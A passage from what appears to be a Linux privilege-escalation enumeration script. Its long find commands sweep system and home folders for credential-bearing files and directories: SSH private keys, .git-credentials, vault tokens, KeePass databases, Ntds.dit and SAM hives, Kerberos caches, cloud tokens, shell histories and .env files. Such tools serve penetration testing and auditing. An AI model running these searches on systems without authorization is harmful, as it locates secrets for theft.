  1119	  FIND_DIR_CUSTOM=`eval_bckgrd "find $SEARCH_IN_FOLDER -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \"kubelet\" -o -name \"postfix\" -o -name \".vnc\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"system-connections\" -o -name \"couchdb\" -o -name \"pam.d\" -o -name \"environments\" -o -name \"kubernetes\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"kube-proxy\" -o -name \"bind\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" -o -name \"system.d\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1120	  FIND_CUSTOM=`eval_bckgrd "find $SEARCH_IN_FOLDER -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"agent*\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"sess_*\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"*knockd*\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \"exports\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"ssh*config\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1121	
  1122	
  1123	  wait # Always wait at the end
  1124	  CONT_THREADS=0 #Reset the threads counter
  1125	
  1126	elif echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets || echo $CHECKS | grep -q software_information || echo $CHECKS | grep -q interesting_files; then
  1127	
  1128	  printf $GREEN"Caching directories "$NC
  1129	
  1130	  CONT_THREADS=0
  1131	  # FIND ALL KNOWN INTERESTING SOFTWARE FILES
  1132	  FIND_DIR_APPLICATIONS=`eval_bckgrd "find ${ROOT_FOLDER}applications -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1133	  FIND_DIR_BIN=`eval_bckgrd "find ${ROOT_FOLDER}bin -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1134	  FIND_DIR_CACHE=`eval_bckgrd "find ${ROOT_FOLDER}.cache -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1135	  FIND_DIR_CDROM=`eval_bckgrd "find ${ROOT_FOLDER}cdrom -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1136	  FIND_DIR_ETC=`eval_bckgrd "find ${ROOT_FOLDER}etc -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \"kubelet\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"system-connections\" -o -name \"concourse-auth\" -o -name \"pam.d\" -o -name \"couchdb\" -o -name \"kubernetes\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"kube-proxy\" -o -name \"bind\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" -o -name \"system.d\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1137	  FIND_DIR_HOMESEARCH=`eval_bckgrd "find $HOMESEARCH -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1138	  FIND_DIR_MEDIA=`eval_bckgrd "find ${ROOT_FOLDER}media -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1139	  FIND_DIR_MNT=`eval_bckgrd "find ${ROOT_FOLDER}mnt -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1140	  FIND_DIR_OPT=`eval_bckgrd "find ${ROOT_FOLDER}opt -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1141	  FIND_DIR_PRIVATE=`eval_bckgrd "find ${ROOT_FOLDER}private -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1142	  FIND_DIR_SBIN=`eval_bckgrd "find ${ROOT_FOLDER}sbin -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1143	  FIND_DIR_SNAP=`eval_bckgrd "find ${ROOT_FOLDER}snap -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1144	  FIND_DIR_SRV=`eval_bckgrd "find ${ROOT_FOLDER}srv -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1145	  FIND_DIR_TMP=`eval_bckgrd "find ${ROOT_FOLDER}tmp -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1146	  FIND_DIR_USR=`eval_bckgrd "find ${ROOT_FOLDER}usr -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"bind\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1147	  FIND_DIR_VAR=`eval_bckgrd "find ${ROOT_FOLDER}var -type d -name \"gcloud\" -o -name \"doctl\" -o -name \"sentry\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"nginx\" -o -name \"neo4j\" -o -name \"mysql\" -o -name \"concourse-keys\" -o -name \"kubelet\" -o -name \".vnc\" -o -name \"postfix\" -o -name \"zabbix\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \".cloudflared\" -o -name \"varnish\" -o -name \"ipa\" -o -name \".docker\" -o -name \"*jenkins\" -o -name \"ErrorRecords\" -o -name \"concourse-auth\" -o -name \"couchdb\" -o -name \"kubernetes\" -o -name \"environments\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"kube-proxy\" -o -name \"bind\" -o -name \"legacy_credentials\" -o -name \"keyrings\" -o -name \"seeddms*\" -o -name \".svn\" -o -name \"sites-enabled\" -o -name \"dirsrv\" -o -name \".irssi\" -o -name \"cacti\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1148	  FIND_DIR_CONCOURSE_AUTH=`eval_bckgrd "find ${ROOT_FOLDER}concourse-auth -type d -name \"concourse-auth\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1149	  FIND_DIR_CONCOURSE_KEYS=`eval_bckgrd "find ${ROOT_FOLDER}concourse-keys -type d -name \"concourse-keys\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1150	  FIND_APPLICATIONS=`eval_bckgrd "find ${ROOT_FOLDER}applications -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name 